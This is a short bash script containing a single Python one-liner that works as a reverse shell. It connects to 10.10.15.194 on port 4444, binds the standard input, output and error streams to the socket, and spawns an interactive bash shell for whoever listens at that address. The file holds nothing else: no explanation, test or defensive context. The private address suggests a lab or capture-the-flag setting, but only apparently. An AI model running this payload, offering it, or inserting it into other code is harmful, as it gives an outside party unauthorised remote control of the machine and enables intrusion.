#!/bin/bash
python3 -c 'import pty,socket,os; s=socket.socket(); s.connect(("10.10.15.194",4444)); [os.dup2(s.fileno(),x) for x in (0,1,2)]; pty.spawn("/bin/bash")'
